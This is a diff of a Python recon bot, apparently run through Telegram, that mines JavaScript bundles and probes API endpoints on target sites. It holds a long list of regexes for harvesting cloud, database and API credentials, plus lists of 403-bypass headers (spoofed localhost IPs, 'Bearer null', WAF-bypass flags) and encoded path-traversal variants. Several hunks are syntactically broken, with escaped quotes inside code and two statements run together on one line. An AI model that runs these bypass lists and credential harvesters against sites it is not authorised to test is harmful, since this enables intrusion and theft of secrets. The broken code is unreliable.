-    (re.compile(r'(?i)f["\x27"](?:SELECT|INSERT).*?\{.*?(?:request|user|query)'),                        '🟠 f-string SQL'),
+    (re.compile(r'(?i)f["\'](?:SELECT|INSERT).*?\{.*?(?:request|user|query)'),                        '🟠 f-string SQL'),
 ]
 
 _VULN_PACKAGES = {
@@ -2846,8 +2782,8 @@ _VULN_PACKAGES = {
 
 _TOKEN_EXTRACT_PATTERNS = [
     (re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'),              'JWT Token'),
-    (re.compile(r'(?i)"(?:access_token|token|auth_token|id_token|refresh_token|session_id|sessionid|sessionToken)"\s*[:=]\s*["\x27"]([A-Za-z0-9_.\-+/]{20,})["\x27"]'), 'Access/Session Token'),
-    (re.compile(r'(?i)"(?:api_key|apiKey|api-key|apikey|x-api-key|x-auth-token)"\s*[:=]\s*["\x27"]([A-Za-z0-9_.\-]{16,})["\x27"]'), 'API Key (JSON)'),
+    (re.compile(r'(?i)"(?:access_token|token|auth_token|id_token|refresh_token|session_id|sessionid|sessionToken)"\s*[:=]\s*["\']([A-Za-z0-9_.\-+/]{20,})["\']'), 'Access/Session Token'),
+    (re.compile(r'(?i)"(?:api_key|apiKey|api-key|apikey|x-api-key|x-auth-token)"\s*[:=]\s*["\']([A-Za-z0-9_.\-]{16,})["\']'), 'API Key (JSON)'),
     (re.compile(r'(?i)Authorization\s*:\s*Bearer\s+([A-Za-z0-9_.\-+/]{20,})'), 'Bearer Token'),
     (re.compile(r'(?i)Authorization\s*:\s*Basic\s+([A-Za-z0-9+/=]{8,})'), 'Basic Auth'),
     (re.compile(r'(?i)X-Auth-Token\s*:\s*([A-Za-z0-9_.\-+/]{20,})'), 'X-Auth-Token'),
@@ -3021,14 +2957,14 @@ _BUNDLE_INTEL: dict = {'env_vars': {}, 'js_routes': [], 'chunk_urls': []}
 
 _RE_ENV_CAPTURE  = re.compile(
     r"(?:process[.]env[.]|REACT_APP_|NEXT_PUBLIC_|VUE_APP_|VITE_)([A-Z_]{3,40})"
-    r"[\s]*(?:[=:]|[|]{2})[\s]*[\x22']([^\x22']{4,200})[\x22']"
+    r"[\s]*(?:[=:]|[|]{2})[\s]*[\x22\x27]([^\x22\x27]{4,200})[\x22\x27]"
 )
 _RE_WEBPACK_MAP  = re.compile(r"(\d+)[^a-z]:\s*[^a-z]([a-f0-9]{8,20})")
 _RE_NEXT_PAGES   = re.compile(r"(/[^\s]{1,80})[^a-z]:\s*[^a-z]([a-f0-9]+[.]js)")
 _ROUTE_RE_LIST   = [
-    re.compile(r"(?:router|app)[\s]*[.][\s]*(get|post|put|delete|patch)[\s]*[(][\s]*[\x22']([^\x22'\s]{2,80})[\x22']"),
-    re.compile(r"path[\s]*:[\s]*[\x22'](/[^\x22'\s,}{]{1,100})[\x22']"),
-    re.compile(r"<Route[^>]+(?:path|to)[\s]*=[\s]*[\x22'](/[^\x22'\s,)>]{1,100})[\x22']"),
+    re.compile(r"(?:router|app)[\s]*[.][\s]*(get|post|put|delete|patch)[\s]*[(][\s]*[\x22\x27]([^\x22\x27\s]{2,80})[\x22\x27]"),
+    re.compile(r"path[\s]*:[\s]*[\x22\x27](/[^\x22\x27\s,}{]{1,100})[\x22\x27]"),
+    re.compile(r"<Route[^>]+(?:path|to)[\s]*=[\s]*[\x22\x27](/[^\x22\x27\s,)>]{1,100})[\x22\x27]"),
     re.compile(r'pages/([a-z0-9_\-\[\]/]+)\.(?:tsx?|jsx?)', re.I),
     re.compile(r'app/([a-z0-9_\-\[\]/]+)/page\.(?:tsx?|jsx?)', re.I),
 ]
@@ -3143,9 +3079,9 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
 
     # ── Phase C: Deep-mine each JS bundle ────────────────────────────────────
     def _fetch_and_mine(js_url):
-        result = {'urls': [], 'routes': [], 'env': {}, 'secrets': []}
+        result = {'urls': [], 'routes': [], 'env': {}}
         try:
-            r = requests.get(js_url, headers=HEADERS, timeout=15, verify=False)
+            r = requests.get(js_url, headers=HEADERS, timeout=12, verify=False)
             if r.status_code != 200 or len(r.text) < 100:
                 return result
             content = r.text
@@ -3163,27 +3099,15 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
             # Env vars / config values containing URL/API hints
             for m in _RE_ENV_CAPTURE.finditer(content):
                 var_name, var_val = m.group(1), m.group(2)
-                if any(k in var_name for k in ('URL', 'API', 'BASE', 'HOST', 'ENDPOINT', 'SERVICE',
-                                                 'KEY', 'SECRET', 'TOKEN', 'PASSWORD', 'PASS')):
+                if any(k in var_name for k in ('URL', 'API', 'BASE', 'HOST', 'ENDPOINT', 'SERVICE')):
                     result['env'][var_name] = var_val
-
-            # Secret patterns quick-scan
-            for pat, label in _ANALYZE_SECRET_PATTERNS[:30]:  # fast subset
-                try:
-                    for m in set(re.findall(pat, content)):
-                        val = m[-1] if isinstance(m, tuple) else m
-                        if len(val) >= 8:
-                            masked = val[:6] + "···" + val[-4:] if len(val) > 10 else val
-                            result['secrets'].append(f"{label}: `{masked[:60]}`")
-                except Exception:
-                    pass
 
             # Webpack runtime chunk map → discover dynamic import chunks
             if 'webpackChunk' in content or '__webpack_require__' in content:
                 chunk_map = dict(_RE_WEBPACK_MAP.findall(content[:60000]))
                 if chunk_map:
                     base_js = js_url.rsplit('/', 1)[0] + '/'
-                    for cid, chash in list(chunk_map.items())[:60]:
+                    for cid, chash in list(chunk_map.items())[:40]:
                         chunk_url = f"{base_js}{cid}.{chash}.js"
                         result['urls'].append(chunk_url)
 
@@ -3198,9 +3122,8 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
             logging.debug("JS mine %s: %s", js_url, _e)
         return result
 
-    js_all_secrets = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=24) as ex:
-        futs = {ex.submit(_fetch_and_mine, u): u for u in js_urls[:120]}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
+        futs = {ex.submit(_fetch_and_mine, u): u for u in js_urls[:60]}
         try:
             for fut in concurrent.futures.as_completed(futs, timeout=55):
                 try:
@@ -3209,7 +3132,6 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
                         found.add(url.split('?')[0])
                     routes.extend(res['routes'])
                     env_vars.update(res['env'])
-                    js_all_secrets.extend(res.get('secrets', []))
                 except Exception:
                     pass
         except concurrent.futures.TimeoutError:
@@ -3218,7 +3140,6 @@ def _mine_js_bundles(html: str, root: str, proxies) -> list:
     # Save intel for report
     _BUNDLE_INTEL['env_vars']  = env_vars
     _BUNDLE_INTEL['js_routes'] = list(set(routes))
-    _BUNDLE_INTEL['js_secrets'] = list(dict.fromkeys(js_all_secrets))[:50]  # deduplicated
 
     # Convert discovered routes to probe URLs
     for route in set(routes):
@@ -3611,7 +3532,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
                 elif "html" in ct and any(k in url for k in ("/swagger","/redoc","/docs","/api-ui","/api-doc")):
                     endpoint["type"] = "API_DOCS"; endpoint["preview"] = "Swagger/OpenAPI docs"
                     endpoint["risk"] += 10
-                    sm = re.search(r"url\s*:\s*[\x22']([^\x22']+\.json)[\x22']", body)
+                    sm = re.search(r"url\s*:\s*[\x22\x27]([^\x22\x27]+\.json)[\x22\x27]", body)
                     if sm:
                         spec_url_found = sm.group(1)
                         if spec_url_found.startswith("/"): spec_url_found = root + spec_url_found
@@ -3660,7 +3581,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
         fmap = {ex.submit(_probe, path): path for path in all_probe_paths}
         done = 0
         try:
-            for fut in concurrent.futures.as_completed(fmap, timeout=180):
+            for fut in concurrent.futures.as_completed(fmap, timeout=120):
                 done += 1
                 try:
                     result = fut.result(timeout=8)
@@ -3674,9 +3595,7 @@ def discover_api_endpoints(base_url: str, progress_cb=None) -> dict:
                         f"🔌 Scanning: `{done}/{total}`\n"
                         f"✅ JSON: `{sum(1 for e in found if e['type']=='JSON_API')}` | "
                         f"🔒 Protected: `{sum(1 for e in found if e['type']=='PROTECTED')}` | "
-                        f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}` | "
-                        f"📄 Config: `{sum(1 for e in found if e['type']=='CONFIG_LEAK')}` | "
-                        f"🗺️ SrcMap: `{sum(1 for e in found if e['type']=='SOURCE_MAP')}`"
+                        f"📰 RSS: `{sum(1 for e in found if e['type']=='XML/RSS')}`"
                     )
                 if probe_delay > 0:
                     time.sleep(probe_delay)
@@ -3753,7 +3672,7 @@ def get_internal_links(html: str, base_url: str, soup=None) -> set:
             
     # 2. Advanced Regex Discovery for hidden routes (v46)
     # Scan for anything that looks like a path: /api/v1/..., /dashboard, etc.
-    path_regex = re.compile(r'["\x27`](/[a-zA-Z0-9_\-\./]+)["\x27`]')
+    path_regex = re.compile(r'["\'`](/[a-zA-Z0-9_\-\./]+)["\'`]')
     for m in path_regex.finditer(html):
         path = m.group(1)
         if len(path) > 1 and not path.startswith('//'):
@@ -5809,17 +5728,18 @@ def rewrite_html_links(html: str, page_url: str, domain_dir: str) -> str:
                     tag['poster'] = _url_to_rel_local(full, page_local, domain_dir)
 
         # ── <a href="..."> internal links ─────────
-        for tag in soup.find_all(['a', 'link', 'script', 'img'], href=True) + soup.find_all('img', src=True) + soup.find_all('script', src=True):
-            href = tag.get('href') or tag.get('src')
-            if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:')):
+        # v46: Extract links from various tags
+         # v46: Extract links from various tags
+        for tag in soup.find_all([\'a\', \'link\', \'script\', \'img\'], href=True) + soup.find_all(\'img\', src=True) + soup.find_all(\'script\', src=True):
+            href = tag.get(\'href\') or tag.get(\'src\')
+            if not href or href.startswith((\'#\', \'javascript:\', \'mailto:\', \'tel:\')):
                 continue
             full = urljoin(url, href)
             if full.startswith(origin):
                 if full not in internal: internal.append(full)
             else:
-                if full.startswith('http') and full not in external:
-                    external.append(full)
-                full = urljoin(page_url, tag['action'])
+                if full.startswith(\'http\') and full not in external:
+                    external.append(full)full = urljoin(page_url, tag['action'])
             if full.startswith(page_origin):
                 tag['action'] = _url_to_rel_local(full, page_local, domain_dir)
 
@@ -5870,7 +5790,7 @@ def _rewrite_css_urls(css: str, page_url: str, page_local: str, domain_dir: str,
         if full.startswith(origin):
             return f"url('{_url_to_rel_local(full, page_local, domain_dir)}')"
         return m.group(0)
-    return re.sub(r'''url\(\s*(["\x27"]?[^)"'\s]+["\x27"]?)\s*\)''', _replacer, css)
+    return re.sub(r'''url\(\s*(["\']?[^)"'\s]+["\']?)\s*\)''', _replacer, css)
 
 
 def download_website(
@@ -6272,7 +6192,7 @@ def download_website(
 
                 return css_hits, js_hits, size_kb, True
 
-            except Exception as e:
+                except Exception as e:
                     err_name = type(e).__name__
                     # v46: More robust error logging for asset download failures
                     logger.warning("Asset download failed [%s] %s: %s",
@@ -6778,9 +6698,9 @@ _SECRET_PATTERNS = {
     "DigitalOcean Token":     (r'dop_v1_[a-f0-9]{64}',                                 "🔴"),
     "DigitalOcean Key":       (r'do_key_[a-f0-9]{40,}',                                "🔴"),
     "Cloudflare API Key":     (r'(?i)cloudflare.{0,20}[0-9a-f]{37}',                   "🔴"),
-    "Cloudflare Global Key":  (r'(?i)x-auth-key["\s:=]+["\x27"][0-9a-f]{37}["\x27"]',       "🔴"),
+    "Cloudflare Global Key":  (r'(?i)x-auth-key["\s:=]+["\'][0-9a-f]{37}["\']',       "🔴"),
     "Azure ConnStr":          (r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[^;]+', "🔴"),
-    "Azure SAS Token":        (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\\s"\x27]{10,}', "🔴"),
+    "Azure SAS Token":        (r'sv=\d{4}-\d{2}-\d{2}&s[a-z]=.{10,}sig=[^&\s"\']{10,}', "🔴"),
     "Heroku API Key":         (r'(?i)heroku.{0,20}[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', "🔴"),
     "Netlify Token":          (r'(?i)netlify.{0,20}[0-9a-zA-Z_\-]{40,}',              "🔴"),
     "Vercel Token":           (r'(?i)vercel.{0,20}[0-9a-zA-Z_\-]{24,}',               "🟠"),
@@ -6802,8 +6722,8 @@ _SECRET_PATTERNS = {
     "Certificate":            (r'-----BEGIN CERTIFICATE-----',                          "🟡"),
     "Bearer Token":           (r'(?i)bearer\s+[a-zA-Z0-9_\-\.]{20,}',                  "🟠"),
     "Basic Auth Header":      (r'(?i)authorization:\s*basic\s+[A-Za-z0-9+/=]{8,}',     "🟠"),
-    "OAuth Client Secret":    (r'(?i)client[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🔴"),
-    "Auth Token Generic":     (r'(?i)auth[_-]?token["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🟠"),
+    "OAuth Client Secret":    (r'(?i)client[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🔴"),
+    "Auth Token Generic":     (r'(?i)auth[_-]?token["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🟠"),
     # ── Google / Firebase ─────────────────────────
     "Google API Key":         (r'AIza[0-9A-Za-z_-]{35}',                               "🔴"),
     "Firebase Config":        (r'"apiKey"\s*:\s*"AIza[0-9A-Za-z_-]{35}"',              "🔴"),
@@ -6834,7 +6754,7 @@ _SECRET_PATTERNS = {
     "Twilio Key":             (r'SK[0-9a-fA-F]{32}',                                   "🟠"),
     "Twilio AccountSID":      (r'AC[a-z0-9]{32}',                                      "🟡"),
     "Twilio Auth Token":      (r'(?i)twilio.{0,20}auth.{0,10}[0-9a-f]{32}',            "🔴"),
-    "Vonage / Nexmo":         (r'(?i)nexmo.{0,20}api_secret["\s:=]+["\x27"][a-zA-Z0-9]{16}["\x27"]', "🔴"),
+    "Vonage / Nexmo":         (r'(?i)nexmo.{0,20}api_secret["\s:=]+["\'][a-zA-Z0-9]{16}["\']', "🔴"),
     # ── AI / ML ───────────────────────────────────
     "OpenAI Key":             (r'sk-[a-zA-Z0-9]{48}',                                  "🔴"),
     "OpenAI Project Key":     (r'sk-proj-[a-zA-Z0-9\-_]{80,}',                        "🔴"),
@@ -6843,26 +6763,26 @@ _SECRET_PATTERNS = {
     "Cohere API Key":         (r'(?i)cohere.{0,20}[a-zA-Z0-9_\-]{40}',                "🟠"),
     "Replicate Token":        (r'r8_[a-zA-Z0-9]{40}',                                  "🟠"),
     # ── Database ──────────────────────────────────
-    "MongoDB URI":            (r'mongodb(?:\+srv)?://[^\\s"\x27]<>]{10,}',                  "🔴"),
-    "MySQL DSN":              (r'mysql://[^\\s"\x27]<>]{10,}',                               "🔴"),
-    "PostgreSQL DSN":         (r'postgres(?:ql)?://[^\\s"\x27]<>]{10,}',                    "🔴"),
-    "Redis URI":              (r'redis://[^\\s"\x27]<>:]+:[^\\s"\x27]<>@]+@[^\\s"\x27]<>]+',        "🔴"),
-    "Elasticsearch":          (r'https?://[^:]+:[^@]+@[^\\s"\x27]<>]*:9200',               "🔴"),
-    "ClickHouse DSN":         (r'clickhouse://[^\\s"\x27]<>]{10,}',                         "🔴"),
-    "Cassandra Host":         (r'(?i)cassandra.{0,20}host["\s:=]+["\x27"][0-9.]+["\x27"]',   "🟡"),
+    "MongoDB URI":            (r'mongodb(?:\+srv)?://[^\s"\'<>]{10,}',                  "🔴"),
+    "MySQL DSN":              (r'mysql://[^\s"\'<>]{10,}',                               "🔴"),
+    "PostgreSQL DSN":         (r'postgres(?:ql)?://[^\s"\'<>]{10,}',                    "🔴"),
+    "Redis URI":              (r'redis://[^\s"\'<>:]+:[^\s"\'<>@]+@[^\s"\'<>]+',        "🔴"),
+    "Elasticsearch":          (r'https?://[^:]+:[^@]+@[^\s"\'<>]*:9200',               "🔴"),
+    "ClickHouse DSN":         (r'clickhouse://[^\s"\'<>]{10,}',                         "🔴"),
+    "Cassandra Host":         (r'(?i)cassandra.{0,20}host["\s:=]+["\'][0-9.]+["\']',   "🟡"),
     "S3 Bucket URL":          (r'https://[a-z0-9\-\.]+\.s3(?:[\.\-][a-z0-9\-]+)?\.amazonaws\.com', "🟡"),
     # ── Secrets / Security ────────────────────────
     "HashiCorp Vault Token":  (r'hvs\.[a-zA-Z0-9_\-]{24,}',                           "🔴"),
-    "Vault Generic Token":    (r'(?i)vault.{0,20}token["\s:=]+["\x27"][a-zA-Z0-9_\-\.]{24,}["\x27"]', "🔴"),
-    "Generic Password":       (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\x27"][^"\x27]{8,}["\x27"]', "🟠"),
-    "Secret Key":             (r'(?i)secret[_-]?key["\s:=]+["\x27"][a-zA-Z0-9!@#$%^&*_\-]{16,}["\x27"]', "🟠"),
-    "API Key Generic":        (r'(?i)api[_-]?key["\s:=]+["\x27"][a-zA-Z0-9_\-]{16,}["\x27"]', "🟡"),
-    "Access Key Generic":     (r'(?i)access[_-]?key["\s:=]+["\x27"][a-zA-Z0-9_\-]{16,}["\x27"]', "🟡"),
+    "Vault Generic Token":    (r'(?i)vault.{0,20}token["\s:=]+["\'][a-zA-Z0-9_\-\.]{24,}["\']', "🔴"),
+    "Generic Password":       (r'(?i)(?:password|passwd|pwd)\s*[=:]\s*["\'][^"\']{8,}["\']', "🟠"),
+    "Secret Key":             (r'(?i)secret[_-]?key["\s:=]+["\'][a-zA-Z0-9!@#$%^&*_\-]{16,}["\']', "🟠"),
+    "API Key Generic":        (r'(?i)api[_-]?key["\s:=]+["\'][a-zA-Z0-9_\-]{16,}["\']', "🟡"),
+    "Access Key Generic":     (r'(?i)access[_-]?key["\s:=]+["\'][a-zA-Z0-9_\-]{16,}["\']', "🟡"),
     "Internal IP Leak":       (r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})', "🟡"),
     # ── Maps / Geo ────────────────────────────────
     "Google Maps Key":        (r'AIza[0-9A-Za-z_-]{35}',                               "🟠"),
     "Mapbox Token":           (r'pk\.[a-zA-Z0-9]{60,}\.[a-zA-Z0-9_\-]{22,}',          "🟠"),
-    "HERE Maps Key":          (r'(?i)here.{0,10}apikey["\s:=]+["\x27"][a-zA-Z0-9_\-]{40}["\x27"]', "🟠"),
+    "HERE Maps Key":          (r'(?i)here.{0,10}apikey["\s:=]+["\'][a-zA-Z0-9_\-]{40}["\']', "🟠"),
     # ── Misc SaaS ────────────────────────────────
     "Zendesk Token":          (r'(?i)zendesk.{0,20}[a-zA-Z0-9_\-]{40,}',              "🟠"),
     "Shopify Token":          (r'shpat_[a-fA-F0-9]{32}',                               "🔴"),
@@ -6878,13 +6798,13 @@ _SECRET_PATTERNS = {
     "Doppler Token":          (r'dp\.pt\.[a-zA-Z0-9]{40,}',                            "🔴"),
     "Infisical Token":        (r'infisical:[a-zA-Z0-9_\-]{40,}',                       "🔴"),
     "PyPI Token":             (r'pypi-[A-Za-z0-9_\-]{100,}',                           "🔴"),
-    "Terraform Cloud Token":  (r'(?i)terraform.{0,20}token["\s:=]+["\x27"][a-zA-Z0-9_\-\.]{20,}["\x27"]', "🔴"),
+    "Terraform Cloud Token":  (r'(?i)terraform.{0,20}token["\s:=]+["\'][a-zA-Z0-9_\-\.]{20,}["\']', "🔴"),
     "Pulumi Token":           (r'pul-[a-zA-Z0-9]{40}',                                 "🔴"),
     "Okta API Token":         (r'(?i)okta.{0,20}[a-zA-Z0-9_-]{40}',                   "🔴"),
-    "Auth0 Client Secret":    (r'(?i)auth0.{0,20}client.{0,10}secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{40,}["\x27"]', "🔴"),
+    "Auth0 Client Secret":    (r'(?i)auth0.{0,20}client.{0,10}secret["\s:=]+["\'][a-zA-Z0-9_\-]{40,}["\']', "🔴"),
     "Twitch Client Secret":   (r'(?i)twitch.{0,20}[a-zA-Z0-9_]{30}',                  "🟠"),
     "Twitter Bearer":         (r'AAAAAAAAAAAAAAAAAAAAA[a-zA-Z0-9%]+',                  "🟠"),
-    "Instagram Token":        (r'(?i)instagram.{0,20}access.{0,10}token["\s:=]+["\x27"][a-zA-Z0-9_\-\.]{40,}["\x27"]', "🟠"),
+    "Instagram Token":        (r'(?i)instagram.{0,20}access.{0,10}token["\s:=]+["\'][a-zA-Z0-9_\-\.]{40,}["\']', "🟠"),
     "Zoom JWT Secret":        (r'(?i)zoom.{0,20}[a-zA-Z0-9_\-]{40}',                  "🟠"),
     "Asana PAT":              (r'0\/[0-9]{16}:[a-zA-Z0-9]{32}',                        "🔴"),
     "Monday.com Token":       (r'(?i)monday.{0,20}[a-zA-Z0-9_\-]{40,}',               "🟠"),
@@ -6893,11 +6813,11 @@ _SECRET_PATTERNS = {
     "Elastic APM":            (r'(?i)elastic.{0,20}apm.{0,20}[a-zA-Z0-9_\-]{40}',    "🔴"),
     "Grafana API Key":        (r'(?i)grafana.{0,20}[a-zA-Z0-9_\-]{40}',               "🔴"),
     "GitBook Token":          (r'(?i)gitbook.{0,20}[a-zA-Z0-9_\-]{40}',               "🟠"),
-    "Webhook Secret":         (r'(?i)webhook[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🟠"),
-    "Encryption Key Generic": (r'(?i)(?:aes|encrypt|cipher)[_-]?key["\s:=]+["\x27"][a-zA-Z0-9/+=]{16,}["\x27"]', "🔴"),
-    "HMAC Secret":            (r'(?i)hmac[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-]{20,}["\x27"]', "🟠"),
-    "Database Password":      (r'(?i)db[_-]?pass(?:word)?["\s:=]+["\x27"][^"\x27]{8,}["\x27"]', "🟠"),
-    "JWT Secret":             (r'(?i)jwt[_-]?secret["\s:=]+["\x27"][a-zA-Z0-9_\-!@#$%^&*]{16,}["\x27"]', "🔴"),
+    "Webhook Secret":         (r'(?i)webhook[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🟠"),
+    "Encryption Key Generic": (r'(?i)(?:aes|encrypt|cipher)[_-]?key["\s:=]+["\'][a-zA-Z0-9/+=]{16,}["\']', "🔴"),
+    "HMAC Secret":            (r'(?i)hmac[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-]{20,}["\']', "🟠"),
+    "Database Password":      (r'(?i)db[_-]?pass(?:word)?["\s:=]+["\'][^"\']{8,}["\']', "🟠"),
+    "JWT Secret":             (r'(?i)jwt[_-]?secret["\s:=]+["\'][a-zA-Z0-9_\-!@#$%^&*]{16,}["\']', "🔴"),
 }
 
 async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -7212,57 +7132,26 @@ async def cmd_extract(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ══════════════════════════════════════════════════
 
 _BYPASS_HEADERS = [
-    # IP spoofing — internal
     {"X-Original-URL":             "{path}"},
     {"X-Rewrite-URL":              "{path}"},
     {"X-Custom-IP-Authorization":  "127.0.0.1"},
     {"X-Forwarded-For":            "127.0.0.1"},
     {"X-Forwarded-For":            "localhost"},
-    {"X-Forwarded-For":            "0.0.0.0"},
-    {"X-Forwarded-For":            "::1"},
-    {"X-Forwarded-For":            "192.168.1.1"},
     {"X-Remote-IP":                "127.0.0.1"},
     {"X-Remote-Addr":              "127.0.0.1"},
     {"X-Host":                     "localhost"},
     {"X-Real-IP":                  "127.0.0.1"},
     {"X-ProxyUser-Ip":             "127.0.0.1"},
+    {"Referer":                    "{url}"},
     {"X-Originating-IP":           "127.0.0.1"},
     {"True-Client-IP":             "127.0.0.1"},
     {"Client-IP":                  "127.0.0.1"},
     {"CF-Connecting-IP":           "127.0.0.1"},
     {"Forwarded":                  "for=127.0.0.1"},
-    {"Forwarded":                  "for=\"[::1]\""},
-    {"X-Cluster-Client-IP":        "127.0.0.1"},
-    {"X-Real-Ip":                  "127.0.0.1"},
-    {"X-Client-IP":                "127.0.0.1"},
-    {"X-Backend-Server":           "localhost"},
-    # Auth bypass
-    {"Authorization":              "Bearer null"},
-    {"Authorization":              "Bearer undefined"},
-    {"Authorization":              "Bearer admin"},
-    {"Authorization":              "null"},
-    {"X-Auth-Token":               "null"},
-    {"X-Access-Token":             "null"},
-    # Header tricks
-    {"Referer":                    "{url}"},
     {"X-Frame-Options":            "Allow"},
     {"X-WAF-Bypass":               "1"},
     {"X-Bypass":                   "1"},
-    {"X-Sucuri-Bypass":            "1"},
-    {"X-Akamai-Bypass":            "1"},
-    # Content-type tricks
-    {"Content-Type":               "application/json"},
-    {"Content-Type":               "text/html"},
-    # Admin IP tricks
-    {"X-Admin":                    "1"},
-    {"X-Internal":                 "true"},
-    {"X-Debug":                    "1"},
-    {"X-Dev":                      "true"},
-    {"X-Override":                 "1"},
-    # Cache tricks
-    {"Cache-Control":              "no-cache"},
-    {"Pragma":                     "no-cache"},
-    {"X-Cache-Bypass":             "1"},
+    {"Authorization":              "Bearer null"},
 ]
 
 _BYPASS_PATH_VARIANTS = [
@@ -7281,17 +7170,6 @@ _BYPASS_PATH_VARIANTS = [
     "/{path_upper}",
     "/{path_lower}",
     "{path_dot_slash}",
-    # v46: more bypass variants
-    "/{path_no_slash}%23",      # URL-encoded #
-    "/{path_no_slash}%3f",      # URL-encoded ?
-    "/{path_no_slash}%2f",      # URL-encoded /
-    "/{path_no_slash}%252f",    # double-encoded /
-    "/{path_no_slash}/.;/",     # Spring path traversal
-    "/{path_no_slash};jsessionid=x",  # Java session bypass
-    "/{path_no_slash}%0a",      # CRLF
-    "/{path_no_slash}.json",    # extension trick
-    "/{path_no_slash}.xml",
-    "/{path_no_slash}.html",
 ]
 
 _BYPASS_METHODS = ["POST", "PUT", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"]
@@ -7649,49 +7527,10 @@ _SUBDOMAIN_WORDLIST = [
     "form","forms","survey","poll","quiz","vote","review","rating",
     "invoice2","quote","contract","legal","tos","privacy","gdpr",
     "notify","notification","sms","otp","verify","verification","2fa",
-    # ── v46: Additional High-Value Words ──────────────────────────
-    "vault","secrets","config","configs","configuration","settings","env",
-    "prod2","production2","live2","release","releases","hotfix","patch",
-    "preview","pre","pre-prod","preprod","ppe","rehearsal",
-    "mgmt2","ops","operations","devops","sre","platform","infra2",
-    "cloud2","k8s","kubernetes","helm","docker2","registry","harbor",
-    "nginx","apache","haproxy","traefik","istio","envoy",
-    "db2","database2","mysql2","postgres","postgresql","pg","maria","mariadb",
-    "mongo","mongodb","redis2","memcached","elasticsearch2","elastic","kibana2",
-    "minio","s3proxy","cdn2","cloudfront","fastly2","akamai2",
-    "api2","api3","api4","apiv1","apiv2","rest2","graphql2","grpc",
-    "microservice","service2","svc2","backend2","frontend","fe","be",
-    "webhook2","callback","events3","bus2","pubsub2","nats2","kafka2","mq2",
-    "reports","reporting","analytics2","bi2","tableau","metabase","redash",
-    "workspace","workspaces","tenant","tenants","org","orgs","organization",
-    "team","teams","group","groups","department","dept",
-    "partner2","vendor","vendors","supplier","suppliers","third-party",
-    "client","clients","customer","customers","account","accounts","user2","users2",
-    "employee","employees","staff","hr","finance","accounting","legal2",
-    "lab","labs","research","innovation","experiment","experiments",
-    "tools","tool","utility","utilities","resource","resources",
-    "gateway2","proxy2","router2","edge2","node3","node4",
-    "us-east","us-west","eu-west","eu-central","ap-southeast","ap-northeast",
-    "r1","r2","r3","az1","az2","az3","zone1","zone2","zone3","region1","region2",
-    "vpn2","bastion","jump","jumphost","ssh2","rdp","sftp","ftps",
-    "wss","websocket","socket2","iot","mqtt","coap",
-    "trace2","apm","rum","observability","telemetry","opentelemetry",
-    "feature2","ab","ab-test","abtest","experiment2","flag2",
-    "legal","tos2","privacy2","compliance2","gdpr2","hipaa","pci",
-    "trust","safe","secure2","shield","protect","protection","firewall",
-    "abuse2","spam","phishing","malware","threat","intel","ti",
-    "cdn3","assets3","static3","media3","files2","uploads",
-    "download","downloads","upload","share","shares","transfer","sync",
-    "backup3","archive3","disaster-recovery","dr2","bcp",
-    "test2","test3","qa2","uat2","sandbox3","demo2","trial",
-    "old","old2","legacy2","v1","v2","v3","new","new2","next2",
-    "alpha","alpha2","beta2","gamma","rc","rc1","rc2",
-    "apps2","webapp","web2","web3","mobile2","native2","hybrid",
 ]
 
-
 def _subdomains_sync(domain: str, progress_q: list) -> dict:
-    """Enumerate subdomains via 10+ sources — v46 Ultra (crt.sh, HackerTarget, AlienVault, URLScan, RapidDNS, Jldc, Anubis, DNS brute-force)."""
+    """Enumerate subdomains via crt.sh + DNS brute-force + HackerTarget."""
     results      = {"crtsh": [], "bruteforce": [], "hackertarget": [], "errors": []}
     found_all    = set()
 
@@ -7762,9 +7601,9 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     progress_q.append("🔍 Querying URLScan.io...")
     try:
         r = requests.get(
-            f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=500",
+            f"https://urlscan.io/api/v1/search/?q=domain:{domain}&size=200",
             headers={"Accept": "application/json"},
-            timeout=15
+            timeout=12
         )
         urlscan_count = 0
         if r.status_code == 200:
@@ -7806,95 +7645,6 @@ def _subdomains_sync(domain: str, progress_q: list) -> dict:
     except Exception as e:
         results["errors"].append(f"RapidDNS: {e}")
 
-    # ── Source 7: Jldc.me (Chaos/ProjectDiscovery mirror) ──
-    progress_q.append("🔍 Querying jldc.me (chaos dataset)...")
-    try:
-        r = requests.get(
-            f"https://jldc.me/anubis/subdomains/{domain}",
-            timeout=12, headers={"Accept": "application/json"}
-        )
-        jldc_count = 0
-        if r.status_code == 200:
-            try:
-                entries = r.json()
-                if isinstance(entries, list):
-                    for h in entries:
-                        if isinstance(h, str) and h.endswith(f".{domain}") and h not in found_all:
-                            found_all.add(h)
